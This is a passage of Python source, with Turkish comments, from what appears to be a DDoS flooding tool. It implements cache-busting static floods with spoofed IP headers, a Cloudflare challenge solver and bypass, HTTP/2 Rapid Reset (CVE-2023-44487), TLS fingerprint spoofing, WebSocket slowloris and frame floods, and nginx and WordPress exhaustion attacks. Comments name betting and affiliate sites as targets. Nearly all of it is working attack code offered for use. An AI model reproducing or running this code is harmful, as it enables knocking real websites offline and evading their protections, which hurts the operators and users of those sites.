        print(f"\033[92m[UAM] Origin IP modu — {len(_UAM_ORIGIN_IPS)} IP, {browser} JA3, CF proxy atlatıldı\033[0m", flush=True)
        _flood_origin(t, rpc, _UAM_ORIGIN_IPS, ck, ck_dict, browser)
    elif ck:
        print(f"\033[93m[UAM] JA3-match cookie bypass — {browser} cipher suite + header order, CF üzerinden\033[0m", flush=True)
        _flood_cf(t, rpc, url, ck, ck_dict, browser)
    else:
        print(f"\033[91m[UAM] Ne origin IP ne cookie var — durduruluyor\033[0m", flush=True)

# Static resource flood — Cloudflare cache bypass + static site exhaustion
# Hedef: CDN/CF arkasındaki statik siteler (bet perdesi, reklam, affiliate, landing)
# Teknik: cache-busting params → CDN miss → origin'i döver
#          + ETag mismatch → her seferinde tam cevap zorunlu
#          + path rotation → WAF'ın statik path whitelist'ini tam kapsar
_STATIC_PATHS = [
    # Evrensel
    '/favicon.ico','/robots.txt','/sitemap.xml','/sitemap_index.xml',
    '/ads.txt','/app-ads.txt','/security.txt','/.well-known/security.txt',
    # CSS/JS
    '/assets/css/main.css','/assets/css/app.css','/assets/css/style.css',
    '/assets/js/app.js','/assets/js/main.js','/assets/js/bundle.js',
    '/static/css/style.css','/static/js/main.js','/static/js/vendor.js',
    '/css/bootstrap.min.css','/css/style.css','/js/jquery.min.js',
    '/js/bootstrap.min.js','/js/app.js',
    # WP static
    '/wp-includes/js/jquery/jquery.min.js',
    '/wp-includes/css/dist/block-library/style.min.css',
    '/wp-content/themes/generatepress/style.css',
    '/wp-content/themes/astra/style.css',
    '/wp-content/themes/hello-elementor/style.css',
    # Bet/affiliate spesifik
    '/live','/sports','/casino','/slots','/betting','/promotions','/bonuses',
    '/en/sports','/tr/sports','/en/casino','/tr/casino',
    # Image/font
    '/images/logo.png','/images/banner.jpg','/img/bg.jpg','/img/logo.svg',
    '/fonts/roboto.woff2','/fonts/opensans.woff2',
    # CDN ve CF
    '/cdn-cgi/rum','/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1',
    '/wp-json/wp/v2/posts',
]
_ACCEPT_MAP = {
    'css': 'text/css,*/*;q=0.1',
    'js':  'application/javascript,*/*;q=0.1',
    'png': 'image/webp,image/apng,image/*,*/*;q=0.8',
    'jpg': 'image/webp,image/apng,image/*,*/*;q=0.8',
    'svg': 'image/svg+xml,image/*,*/*;q=0.8',
    'ico': 'image/x-icon,image/*,*/*;q=0.5',
    'woff2':'font/woff2,font/*,*/*;q=0.7',
    'woff': 'font/woff,font/*,*/*;q=0.7',
    'xml': 'application/xml,text/xml,*/*;q=0.9',
    'txt': 'text/plain,*/*;q=0.9',
    'json':'application/json,*/*;q=0.9',
}

def w_STATICHTTP(t, rpc):
    """
    Statik içerik flood: cache-busting + ETag mismatch + path rotation.
    CF/nginx cache'ini bypass ederek origin'e max baskı uygular.
    Statik site + CDN korumalı bet perdesi için tasarlandı.
    """
    while not _stop.is_set():
        with suppress(Exception):
            s = t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                path = random.choice(_STATIC_PATHS)
                ext  = path.rsplit('.', 1)[-1].lower() if '.' in path.split('/')[-1] else ''
                acc  = _ACCEPT_MAP.get(ext, 'text/html,application/xhtml+xml,*/*;q=0.9')
                ip   = rip()
                # Cache buster: her istek farklı URL → CDN miss → origin vurulur
                bust = f"?v={rstr(10)}&_={rint(100000000,999999999)}"
                # ETag mismatch: sunucuyu tam cevap vermeye zorlar
                etag = f'W/"{rstr(8)}-{rint(1000,9999)}"'
                pl = (
                    f"GET {path}{bust} HTTP/1.1\r\n"
                    f"Host: {t.auth}\r\n"
                    f"Accept: {acc}\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Accept-Language: en-US,en;q=0.9,tr;q=0.8\r\n"
                    f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
                    f"Pragma: no-cache\r\n"
                    f"Connection: keep-alive\r\n"
                    f"User-Agent: {rua()}\r\n"
                    f"Referer: {t.scheme}://{t.host}/\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"X-Real-IP: {ip}\r\n"
                    f"CF-Connecting-IP: {ip}\r\n"
                    f"If-None-Match: {etag}\r\n"
                    f"If-Modified-Since: Mon, 01 Jan 2024 00:00:00 GMT\r\n"
                    f"Sec-Fetch-Dest: {'style' if ext=='css' else 'script' if ext=='js' else 'image' if ext in ('png','jpg','ico','svg') else 'document'}\r\n"
                    f"Sec-Fetch-Mode: no-cors\r\n"
                    f"Sec-Fetch-Site: same-origin\r\n"
                    f"\r\n"
                ).encode()
                if not send(s, pl): break
            close(s)

# ══════════════════════════════════════════════════════════════════════════════
# YENİ METOTLAR: CF_BYPASS · RAPID_RESET · TLS_SPOOF · KILLER
# ══════════════════════════════════════════════════════════════════════════════

# ── HTTP/2 raw frame builder (stdlib, harici kütüphane yok) ───────────────────
def _h2f(ftype, flags, sid, payload=b''):
    """9-byte HTTP/2 frame header + payload."""
    l = len(payload)
    return (struct.pack('!BBB', (l>>16)&0xFF, (l>>8)&0xFF, l&0xFF) +
            struct.pack('!BB', ftype, flags) +
            struct.pack('!I', sid & 0x7FFFFFFF) + payload)

_H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
_H2_INIT    = (_h2f(0x4, 0, 0) +                                    # SETTINGS
               _h2f(0x8, 0, 0, struct.pack('!I', 0x3FFFFFFF)))      # WINDOW_UPDATE

def _h2_hpack(host, path):
    """HPACK static table ile minimal header blok (path/host ≤126 byte)."""
    p = (path.encode() if isinstance(path, str) else path)[:126]
    h = (host.encode() if isinstance(host, str) else host)[:126]
    return (b'\x82\x87'                        # :method GET, :scheme https
          + b'\x04' + bytes([len(p)]) + p      # :path literal (idx 4)
          + b'\x41' + bytes([len(h)]) + h)     # :authority literal (idx 1)

# ── Built-in CF Challenge Solver (stdlib only — cloudscraper mantığından uyarlandı) ──
# Kaynak: cloudflare_v2.py::handle_V2_Challenge, cloudflare_v3.py::handle_V3_Challenge,
#         stealth.py::_apply_browser_quirks, user_agent/__init__.py, browsers.json
# Bağımlılık: sıfır.

# Chrome cipher suite (browsers.json'dan birebir)
_CS_CHROME = (
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:'
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:'
    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:'
    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:'
    'ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:'
    'AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA'
)
# Firefox cipher suite (browsers.json'dan birebir — sıra farklı, bu JA3'ü ayıran şey)
_CS_FIREFOX = (
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:'
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:'
    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:'
    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:'
    'ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:'
    'ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:'
    'DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:AES128-SHA:AES256-SHA'
)

# Browser profilleri — UA, header sırası, sabit headerlar (stealth.py + browsers.json)
_BP = {
    'chrome': {
        'ua':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'ciphers': _CS_CHROME,
        'order':   ['Host','Connection','sec-ch-ua','sec-ch-ua-mobile','sec-ch-ua-platform',
                    'User-Agent','Accept','Sec-Fetch-Site','Sec-Fetch-Mode','Sec-Fetch-User',
                    'Sec-Fetch-Dest','Accept-Encoding','Accept-Language','Cookie'],
        'fixed': {
            'Connection':               'keep-alive',
            'sec-ch-ua':                '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile':         '?0',
            'sec-ch-ua-platform':       '"Windows"',
            'Accept':                   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Sec-Fetch-Site':           'none',
            'Sec-Fetch-Mode':           'navigate',
            'Sec-Fetch-User':           '?1',
            'Sec-Fetch-Dest':           'document',
            'Accept-Encoding':          'gzip, deflate, br',
            'Accept-Language':          'en-US,en;q=0.9',
        }
    },
    'firefox': {
        'ua':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'ciphers': _CS_FIREFOX,
        'order':   ['Host','User-Agent','Accept','Accept-Language','Accept-Encoding',
                    'Connection','Upgrade-Insecure-Requests','Cookie'],
        'fixed': {
            'Accept':                   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language':          'en-US,en;q=0.5',
            'Accept-Encoding':          'gzip, deflate, br',
            'Connection':               'keep-alive',
            'Upgrade-Insecure-Requests':'1',
            'TE':                       'trailers',
        }
    },
}

def _mk_ssl(browser='chrome'):
    """Browser cipher suite ile SSLContext (stdlib ssl, CipherSuiteAdapter mantığı)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    with suppress(Exception): ctx.set_ciphers(_BP.get(browser, _BP['chrome'])['ciphers'])
    with suppress(Exception): ctx.set_ecdh_curve('prime256v1')
    return ctx

def _mk_opener(browser, jar):
    """Cookie jar + browser cipher suite ile urllib opener (stealth.py header sırası)."""
    import urllib.request
    prof   = _BP.get(browser, _BP['chrome'])
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_mk_ssl(browser)),
        urllib.request.HTTPRedirectHandler(),
        urllib.request.HTTPCookieProcessor(jar),
    )
    hdrs = [('User-Agent', prof['ua'])]
    for k in prof['order']:
        if k in prof['fixed'] and k != 'User-Agent':
            hdrs.append((k, prof['fixed'][k]))
    opener.addheaders = hdrs
    return opener

# CF challenge tespit regex'leri (cloudflare.py, cloudflare_v2.py, cloudflare_v3.py'den)
import re as _re
_CF_V3_RE   = _re.compile(r"cpo\.src\s*=.*?orchestrate/jsch/v3|window\._cf_chl_ctx\s*=|__cf_chl_rt_tk=", _re.S)
_CF_V2_RE   = _re.compile(r"cpo\.src\s*=.*?orchestrate/(?:jsch|managed)/v[12]|window\._cf_chl_opt\s*=|__cf_chl_f_tk=", _re.S)
_CF_BLCK_RE = _re.compile(r'<span class="cf-error-code">1020</span>', _re.S)
_CF_TURN_RE = _re.compile(r'class="cf-turnstile"|challenges\.cloudflare\.com/turnstile', _re.S)
_CF_R_RE    = _re.compile(r'name=["\']r["\'][^>]+value=["\']([^"\']{10,})["\']')
_CF_ACT_RE  = _re.compile(r'<form[^>]+id="challenge-form"[^>]+action="([^"]+)"', _re.S)
_CF_OPT_RE  = _re.compile(r'window\._cf_chl_opt\s*=\s*(\{.*?\});', _re.S)

def _cf_type(body, resp_headers):
    """Yanıttan CF challenge türünü tespit et (None = CF yok)."""
    h = {k.lower(): v for k, v in (resp_headers or {}).items()}
    if not (h.get('server', '').lower().startswith('cloudflare') or 'cf-ray' in h):
        return None
    if _CF_BLCK_RE.search(body): return 'blocked'
    if _CF_TURN_RE.search(body): return 'turnstile'
    if _CF_V3_RE.search(body):   return 'v3'
    if _CF_V2_RE.search(body):   return 'v2'
    return None

def _cf_solve(url, browser='chrome', jar=None, timeout=15):
    """
    CF V2/V3 IUAM challenge çöz (saf stdlib).

    Logic kaynağı:
      cloudflare_v2.py::handle_V2_Challenge + generate_challenge_payload
      cloudflare_v3.py::handle_V3_Challenge + extract_v3_challenge_data
      cloudflare.py::Challenge_Response (delay + POST + redirect takibi)

    Adımlar:
      1. Browser cipher suite ile GET → CF challenge sayfası al
      2. challenge türünü tespit et
      3. r token + form action extract et
      4. _cf_chl_opt JSON'dan cvId/chlPageData ekle
      5. 4-5s bekle (CF'nin JS challenge timer'ı)
      6. POST → redirect takip et → cf_clearance cookie'si set olur
    Döner: "cf_clearance=<value>" ya da None
    """
    import urllib.request, urllib.error, http.cookiejar as hcj, json as _js
    from urllib.parse import urlencode, urljoin, urlparse

    if jar is None:
        jar = hcj.CookieJar()
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    opener = _mk_opener(browser, jar)
    prof   = _BP.get(browser, _BP['chrome'])

    try:
        body, resp_headers = '', {}
        try:
            r = opener.open(url, timeout=timeout)
            body = r.read().decode('utf-8', errors='ignore')
            resp_headers = dict(r.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore')
            resp_headers = dict(e.headers)
        except Exception:
            return None

        ctype = _cf_type(body, resp_headers)
        if ctype in (None, 'blocked', 'turnstile'):
            for ck in jar:
                if ck.name == 'cf_clearance': return f'cf_clearance={ck.value}'
            return None

        rm = _CF_R_RE.search(body)
        am = _CF_ACT_RE.search(body)
        if not rm or not am:
            for ck in jar:
                if ck.name == 'cf_clearance': return f'cf_clearance={ck.value}'
            return None

        action_url = am.group(1)
        if not action_url.startswith('http'):
            action_url = urljoin(base, action_url)

        # generate_challenge_payload (cloudflare_v2.py)
        payload = {'r': rm.group(1), 'cf_ch_verify': 'plat',
                   'vc': '', 'captcha_vc': '', 'cf_captcha_kind': 'h', 'h-captcha-response': ''}
        om = _CF_OPT_RE.search(body)
        if om:
            with suppress(Exception):
                opt = _js.loads(om.group(1))
                if 'cvId' in opt:        payload['cv_chal_id']        = opt['cvId']
                if 'chlPageData' in opt: payload['cf_chl_page_data']  = opt['chlPageData']

        # delay (cloudflare.py submit() regex)
        dm = _re.search(r'submit\(\).*?},\s*(\d+)', body, _re.S)
        time.sleep(max(4.0, min(float(dm.group(1)) / 1000 if dm else 5.0, 10.0)))

        # POST + redirect takibi
        req = urllib.request.Request(action_url, urlencode(payload).encode(), method='POST')
        req.add_header('User-Agent',   prof['ua'])
        req.add_header('Origin',       base)
        req.add_header('Referer',      url)
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('Accept',       prof['fixed']['Accept'])
        with suppress(Exception):
            opener.open(req, timeout=timeout)
    except Exception:
        pass

    for ck in jar:
        if ck.name == 'cf_clearance': return f'cf_clearance={ck.value}'
    return None

# ── CF_BYPASS ─────────────────────────────────────────────────────────────────
def w_CF_BYPASS(t, rpc):
    """
    Saf stdlib CF bypass — dışa bağımlılık yok.
    Chrome/Firefox cipher suite + CF V2/V3 challenge solver + cookie carry-forward.
    cf_clearance alındıktan sonra aynı jar ile flood devam eder.
    """
    import urllib.request, http.cookiejar as hcj
    url = f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        with suppress(Exception):
            browser = random.choice(list(_BP.keys()))
            jar     = hcj.CookieJar()
            _cf_solve(url, browser=browser, jar=jar, timeout=12)
            opener  = _mk_opener(browser, jar)
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception):
                    r = opener.open(url, timeout=8)
                    d = r.read()
                    with _lock: SENT[0] += 1; BYTES[0] += len(d)

# ── RAPID_RESET ───────────────────────────────────────────────────────────────

def _h2_hpack_full(host, path):
    """
    Tam tarayıcı HPACK bloğu — sunucu başına daha pahalı header parsing.
    Literal without indexing (0x00 prefix) ile user-agent, accept, accept-encoding
    eklenir; sunucu daha fazla bellek + parse süresi harcar.
    """
    def _ls(b):  # HPACK string: length byte (max 127, no Huffman) + bytes
        b = b[:127]
        return bytes([len(b)]) + b
    p  = (path.encode() if isinstance(path, str) else path)[:127]
    h  = (host.encode() if isinstance(host, str) else host)[:127]
    ua = b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'[:127]
    return (
        b'\x82\x87'                                              # :method GET, :scheme https
        + b'\x04' + _ls(p)                                       # :path
        + b'\x41' + _ls(h)                                       # :authority
        + b'\x00' + _ls(b'user-agent')     + _ls(ua)             # user-agent
        + b'\x00' + _ls(b'accept')         + _ls(b'text/html,application/xhtml+xml,*/*;q=0.9')
        + b'\x00' + _ls(b'accept-encoding') + _ls(b'gzip, deflate, br')
        + b'\x00' + _ls(b'accept-language') + _ls(b'en-US,en;q=0.9')
    )

def w_RAPID_RESET(t, rpc):
    """
    HTTP/2 Rapid Reset (CVE-2023-44487) — güçlendirilmiş versiyon (stdlib only).

    Saldırı özü:
      HEADERS frame → sunucu request slot açar (memory + goroutine/thread)
      RST_STREAM CANCEL → slot serbest kalır — AMA sunucu işlem kuyruğunu
      boşaltamadan yenileri gelirse kuyruk taşar → OOM / event loop tıkanır.

    Eski sürüme göre iyileştirmeler:
      1. _mk_ssl('chrome') — browser TLS el sıkışması → daha fazla TLS kabulü
      2. SO_SNDBUF 512 KB  — kernel gönderim tamponu büyütüldü → veri birikimiyor
      3. SETTINGS INITIAL_WINDOW_SIZE = 2³¹-1 — sunucu stream başına max buffer ayırır
      4. Server SETTINGS okunup SETTINGS ACK gönderilir — sunucu bağlantıyı korur
      5. WINDOW_UPDATE keepalive her 64 stream — flow control bitişi önlenir
      6. 128 KB batch — tek sendall'da daha fazla frame → az syscall, yüksek throughput
      7. Zengin HPACK (_h2_hpack_full) — sunucu stream başına daha fazla bellek + parse
      8. rpc başına iterasyon: max(rpc*100, 5000) — düşük rpc'de bile etkili
    """
    if not t.tls:
        w_GET(t, rpc); return

    _BATCH  = 131072          # 128 KB batch eşiği
    _WSMAX  = 0x7FFFFFFF      # H2 max window size
    _RST    = struct.pack('!I', 8)     # CANCEL error code
    _WU64   = _h2f(0x8, 0, 0, struct.pack('!I', 65535))  # conn WINDOW_UPDATE
    _SACK   = _h2f(0x4, 0x1, 0)       # SETTINGS ACK

    iters = max(rpc * 100, 5000)       # stream sayısı — düşük rpc'de de etkili

    while not _stop.is_set():
        with suppress(Exception):
            # 1. Browser cipher suite ile TLS — daha az "unknown client" reddi
            ctx = _mk_ssl('chrome')
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            with suppress(Exception):
                raw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 19)  # 512 KB
            raw.settimeout(10)
            raw.connect((t.host, t.port))
            s = ctx.wrap_socket(raw, server_hostname=t.host)

            # 2. Preface + SETTINGS: INITIAL_WINDOW_SIZE max + connection WINDOW_UPDATE
            s.sendall(
                _H2_PREFACE +
                _h2f(0x4, 0, 0, struct.pack('!HI', 0x4, _WSMAX)) +
                _h2f(0x8, 0, 0, struct.pack('!I', _WSMAX))
            )

            # 3. Server SETTINGS oku + ACK — bağlantı ömrünü uzatır
            s.settimeout(0.4)
            try:
                s.recv(512)           # server SETTINGS frame
                s.settimeout(None)
                s.sendall(_SACK)      # SETTINGS ACK → sunucu mutlu
            except Exception:
                pass
            s.settimeout(None)

            # 4. Rapid Reset bombardımanı
            sid   = 1
            buf   = b''
            count = 0

            for i in range(iters):
                if _stop.is_set() or sid > 0x7FFFFF0: break

                hpack  = _h2_hpack_full(t.host, t.path)
                buf   += _h2f(0x1, 0x4, sid, hpack)   # HEADERS END_HEADERS
                buf   += _h2f(0x3, 0x0, sid, _RST)    # RST_STREAM CANCEL
                sid   += 2
                count += 1

                # WINDOW_UPDATE keepalive — her 64 stream'de bir
                if count % 64 == 0:
                    buf += _WU64

                # 128 KB dolunca gönder — tek syscall ile max frame
                if len(buf) >= _BATCH:
                    s.sendall(buf)
                    with _lock: SENT[0] += count; BYTES[0] += len(buf)
                    buf = b''; count = 0

            if buf:
                with suppress(Exception): s.sendall(buf)
                with _lock: SENT[0] += max(1, count); BYTES[0] += len(buf)
            close(s)

# ── TLS_SPOOF ─────────────────────────────────────────────────────────────────
def w_TLS_SPOOF(t, rpc):
    """
    TLS cipher suite spoof — stdlib ssl ile Chrome/Firefox TLS el sıkışması.
    browsers.json'dan alınan gerçek cipher sıraları kullanılır;
    her session farklı browser seçer → CF'nin TLS parmak izi tespitini bozar.
    Dışa bağımlılık yok.
    """
    import urllib.request, http.cookiejar as hcj
    url = f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        with suppress(Exception):
            browser = random.choice(list(_BP.keys()))
            jar     = hcj.CookieJar()
            opener  = _mk_opener(browser, jar)
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception):
                    r = opener.open(url, timeout=8)
                    d = r.read()
                    with _lock: SENT[0] += 1; BYTES[0] += len(d)

# ── KILLER ────────────────────────────────────────────────────────────────────
_KILLER_IDX = [0]

def w_KILLER(t, rpc):
    """
    KILLER — 3 vektörü eş zamanlı çalıştır.
      Thread N%3=0 → RAPID_RESET   (HTTP/2 CVE-2023-44487)
      Thread N%3=1 → CF_BYPASS     (cloudscraper) veya UAM_BYPASS (cookie varsa)
      Thread N%3=2 → TLS_SPOOF     (JA3 fingerprint)
    Her vektör threads/3 thread alır; hedef 3 farklı açıdan aynı anda zorlanır.
    """
    with _lock:
        _KILLER_IDX[0] += 1
        role = _KILLER_IDX[0] % 3
    if role == 0:
        w_RAPID_RESET(t, rpc)
    elif role == 1:
        if _UAM_ORIGIN_IPS or _UAM_COOKIE_STR:
            w_UAM_BYPASS(t, rpc)
        else:
            w_CF_BYPASS(t, rpc)
    else:
        w_TLS_SPOOF(t, rpc)

# ══════════════════════════════════════════════════════════════════════════════
# WEBSOCKET_KILLER · NGINX_KILLER · WORDPRESS_KILLER
# ══════════════════════════════════════════════════════════════════════════════

def _ws_frame(opcode, payload=b''):
    """RFC 6455 WebSocket istemci frame'i — FIN=1, masked (client zorunluluğu)."""
    mask = os.urandom(4)
    p    = bytes(b ^ mask[i % 4] for i, b in enumerate(
               payload if isinstance(payload, (bytes, bytearray)) else payload.encode()))
    n    = len(p)
    if   n <= 125:   hdr = bytes([0x80 | opcode, 0x80 | n])
    elif n <= 65535: hdr = bytes([0x80 | opcode, 0x80 | 126]) + struct.pack('!H', n)
    else:            hdr = bytes([0x80 | opcode, 0x80 | 127]) + struct.pack('!Q', n)
    return hdr + mask + p

_WS_PATHS = [
    '/ws', '/websocket', '/wss', '/chat', '/live', '/realtime',
    '/socket.io/', '/events', '/stream', '/api/ws', '/push',
    '/notifications', '/hub', '/hubs', '/signalr/connect',
    '/sockjs/websocket', '/cable', '/updates', '/feed',
]
_WS_PING  = _ws_frame(0x09)   # PING opcode
_WS_CLOSE = _ws_frame(0x08)   # CLOSE opcode

def w_WEBSOCKET_KILLER(t, rpc):
    """
    WebSocket bağlantı tüketici + frame flood (stdlib only).

    Teknik 1 — Slowloris WS (thread %3==0, ~33%):
      WS Upgrade handshake → bağlantıyı açık tut → her 20s PING frame.
      Sunucunun max_connections / worker_connections limitini tüketir.

    Teknik 2 — Frame flood (thread %3==1, ~33%):
      Handshake → 128 B–8 KB arası TEXT/BINARY frame'ler → parse + buffer yükü.
      ws.send() işleyici her frame için event döngüsünde slot açar.

    Teknik 3 — Upgrade spam (thread %3==2, ~33%):
      Sadece Upgrade başlığı gönder, 101 beklemeden bağlantıyı kapat.
      Her deneme yeni TCP+TLS handshake → accept() queue doldurma.

    Endpoint rotasyonu: /ws, /websocket, /socket.io/, /chat, /live vb.
    """
    import base64 as _b64

    with _lock:
        _KILLER_IDX[0] += 1
        role = _KILLER_IDX[0] % 3

    while not _stop.is_set():
        with suppress(Exception):
            path = random.choice(_WS_PATHS)
            key  = _b64.b64encode(os.urandom(16)).decode()
            upgrade_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {t.auth}\r\n"
                f"Connection: Upgrade\r\n"
                f"Upgrade: websocket\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Origin: {t.origin_scheme}://{t.host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"\r\n"
            ).encode()

            if role == 2:  # Upgrade spam — no read
                s = t.conn(3)
                send(s, upgrade_req)
                with _lock: SENT[0] += 1
                close(s)
                continue

            s = t.conn(10)
            send(s, upgrade_req)

            # 101 Switching Protocols bekliyoruz
            s.settimeout(2)
            try:
                resp = s.recv(512).decode('utf-8', errors='ignore')
                upgraded = '101' in resp
            except Exception:
                upgraded = False
            s.settimeout(None)

            if role == 0:  # Slowloris WS
                for _ in range(rpc * 5):
                    if _stop.is_set(): break
                    time.sleep(20)
                    if not send(s, _WS_PING): break
                    with _lock: SENT[0] += 1
            else:           # Frame flood
                for _ in range(rpc):
                    if _stop.is_set(): break
                    sz  = random.choice([128, 512, 1024, 4096, 8192])
                    frm = _ws_frame(random.choice([0x01, 0x02]), os.urandom(sz))
                    if not send(s, frm): break
                    with _lock: SENT[0] += 1; BYTES[0] += len(frm)
            close(s)


# ── NGINX_KILLER ──────────────────────────────────────────────────────────────
def w_NGINX_KILLER(t, rpc):
    """
    Nginx'e özgü çok-vektör L7 flood.

    Teknik 1 — HTTP/1.1 Pipeline flood (40%):
      Tek TCP bağlantıda rpc adet GET → nginx worker o bağlantıyı sırayla işler.
      worker_connections dolduğunda yeni bağlantılar reddedilir.

    Teknik 2 — Header buffer overflow (30%):
      ~7.8 KB rastgele isim=değer header'ları → nginx large_client_header_buffers
      (default: 4×8 KB) max kullanıma iter → header parsing bellek basıncı.

    Teknik 3 — Range exhaustion (20%):
      Range: bytes=0-0,5-10,...,4995-5000 (1000 range) → nginx range parser +
      her range için ayrı sendfile/read → disk I/O + çekirdek context switch.

    Teknik 4 — Slow POST body (10%):
      Content-Length: 50 MB + body yok → nginx client_body_timeout (default 60s)
      boyunca worker bağlantısı meşgul → bağlantı havuzu tükenir.
    """
    while not _stop.is_set():
        with suppress(Exception):
            role = rint(0, 9)

            if role < 4:  # Pipeline flood
                s   = t.conn(10)
                req = (f"GET {t.path} HTTP/1.1\r\nHost: {t.auth}\r\n"
                       f"User-Agent: {rua()}\r\nAccept: */*\r\n"
                       f"Connection: keep-alive\r\n\r\n")
                pipeline = req.encode() * rpc
                send(s, pipeline)
                with _lock: SENT[0] += rpc; BYTES[0] += len(pipeline)
                close(s)

            elif role < 7:  # Header overflow
                s    = t.conn(6)
                # 8 adet ~1 KB başlık → ~8 KB toplam (nginx sınırına yakın)
                hdrs = ''.join(f"X-{rstr(8).capitalize()}: {rstr(980)}\r\n" for _ in range(8))
                req  = (f"GET {t.path} HTTP/1.1\r\nHost: {t.auth}\r\n"
                        f"User-Agent: {rua()}\r\n" + hdrs + "\r\n").encode()
                send(s, req)
                with _lock: SENT[0] += 1; BYTES[0] += len(req)
                close(s)

            elif role < 9:  # Range exhaustion
                s      = t.conn(6)
                ranges = ','.join(f"{i*5}-{i*5+4}" for i in range(1000))
                req    = (f"GET {t.path} HTTP/1.1\r\nHost: {t.auth}\r\n"
                          f"User-Agent: {rua()}\r\n"
                          f"Range: bytes={ranges}\r\n\r\n").encode()
                send(s, req)
                with _lock: SENT[0] += 1; BYTES[0] += len(req)
                close(s)

            else:  # Slow POST body wait
                s   = t.conn(75)
                cl  = rint(50_000_000, 200_000_000)   # 50–200 MB Content-Length
                req = (f"POST {t.path} HTTP/1.1\r\nHost: {t.auth}\r\n"
                       f"User-Agent: {rua()}\r\n"
                       f"Content-Type: application/octet-stream\r\n"
                       f"Content-Length: {cl}\r\n\r\n").encode()
                send(s, req)
                for _ in range(rpc * 3):  # body damla damla → nginx bekler
                    if _stop.is_set(): break
                    time.sleep(2)
                    if not send(s, b'x'): break
                with _lock: SENT[0] += 1
                close(s)


# ── WORDPRESS_KILLER ──────────────────────────────────────────────────────────
def w_WORDPRESS_KILLER(t, rpc):
    """
    WordPress'e özgü çok-vektör L7 flood.

    Cache'siz + PHP/MySQL ağır endpoint'ler:
    1. wp-login.php POST    — PHP session + DB auth sorgusu
    2. /?s=random           — posts LIKE sorgusu (tam tablo taraması, no-cache)
    3. /xmlrpc.php          — wp.getUsersBlogs auth + DB
    4. /wp-json/wp/v2/posts — REST API + JOIN query + JSON encode
    5. admin-ajax heartbeat — session check + option yükleme
    6. /?p=N&preview=true  — tam WP çalışması, cache bypass
    7. wp-comments-post.php — antispam + DB insert
    8. /?cat=N&feed=rss2   — RSS + DB query + XML generate

    Her istek WP'yi tam bootstrap eder: 50-200+ DB sorgusu + PHP eval yükü.
    """
    _ACTIONS = ['heartbeat', 'query-attachments', 'ajax-tag-search',
                'wp-compression-test', 'get-permalink']

    while not _stop.is_set():
        with suppress(Exception):
            s    = t.conn(8)
            mode = rint(0, 7)

            if mode == 0:    # wp-login.php POST
                body = (f"log={rstr(8)}&pwd={rstr(12)}&wp-submit=Log+In"
                        f"&redirect_to=%2Fwp-admin%2F&testcookie=1")
                req = (f"POST /wp-login.php HTTP/1.1\r\nHost: {t.auth}\r\n"
                       f"User-Agent: {rua()}\r\n"
                       f"Referer: {t.scheme}://{t.host}/wp-login.php\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n"
                       f"{body}").encode()
                for _ in range(rpc):
                    if _stop.is_set() or not send(s, req): break

            elif mode == 1:  # DB search — full table scan (LIKE %random%)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    q   = rstr(rint(4, 10))
